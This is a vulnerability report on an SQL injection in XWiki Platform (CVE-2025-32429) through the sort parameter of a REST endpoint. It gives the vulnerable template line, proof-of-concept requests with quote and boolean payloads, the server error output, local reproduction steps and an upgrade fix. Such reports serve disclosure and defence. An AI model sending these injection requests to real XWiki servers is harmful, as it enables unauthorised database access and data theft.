# CVE-2025-32429 Vulnerability Report

## Overview

| Item | Value |
|------|-------|
| CVE ID | CVE-2025-32429 |
| CWE | CWE-89 (SQL Injection) |
| Affected Software | XWiki Platform |
| Affected Versions | 9.4-rc-1 to 16.10.5, 17.0.0-rc-1 to 17.2.2 |
| Fixed Versions | 16.10.6, 17.3.0-rc-1 |
| CVSS Score | 9.3 (Critical) |

## Vulnerability Description

SQL injection vulnerability exists in XWiki Platform's `getdeleteddocuments.vm` template. The `sort` parameter is directly concatenated into an SQL ORDER BY clause without proper sanitization, allowing attackers to inject arbitrary SQL statements.

## Technical Details

### Vulnerable Endpoint

```
GET /rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=<PAYLOAD>
```

### Vulnerable Code

The vulnerability is in the `getdeleteddocuments.vm` template where the `sort` parameter is used directly in the HQL query:

```velocity
#set($hql = "SELECT ddoc.id FROM XWikiDeletedDocument as ddoc WHERE 1=1 order by ${sort} asc")
```

### Proof of Concept

1. Send a request with a single quote in the sort parameter:
```
GET /rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=1'
```

2. The server responds with HTTP 500 and error message:
```
org.hibernate.QueryException: expecting ''', found '<EOF>' 
[SELECT ddoc.id FROM com.xpn.xwiki.doc.XWikiDeletedDocument as ddoc WHERE 1=1 order by 1' asc]
```

This confirms the injected quote breaks the SQL syntax.

## Impact

- **Data Exfiltration**: Attackers can extract sensitive data from the database
- **Authentication Bypass**: Potential to bypass authentication mechanisms
- **Denial of Service**: Malicious queries can degrade database performance
- **No Authentication Required**: This vulnerability can be exploited without any authentication

## Reproduction Steps

1. Start the vulnerable XWiki environment:
   ```bash
   docker-compose up -d
   ```

2. Wait for XWiki to initialize (3-5 minutes)

3. Run the POC script:
   ```bash
   python poc.py http://localhost:8082
   ```

## Verification Results

```
============================================================
CVE-2025-32429 - XWiki SQL Injection PoC
============================================================

[*] Target: http://localhost:8082

[*] Phase 1: Testing connectivity...
[*] Basic request successful, status: 200

[*] Phase 2: Testing error-based SQL injection...
[+] Single quote injection: status=500, len=57737, sql_error=True
[+] Double quote injection: status=500, len=57719, sql_error=True
[+] Boolean injection true: status=500, len=57762, sql_error=True
[+] Boolean injection false: status=500, len=57762, sql_error=True
[+] ORDER BY high number: status=500, len=57776, sql_error=True

============================================================
Summary:
============================================================
[+] CVE-2025-32429 CONFIRMED - Target is VULNERABLE!
    - SQL Error in response: YES
```

## Remediation

Upgrade to XWiki Platform version 16.10.6 or 17.3.0-rc-1 or later. The fix implements proper parameterized queries for the sort parameter.
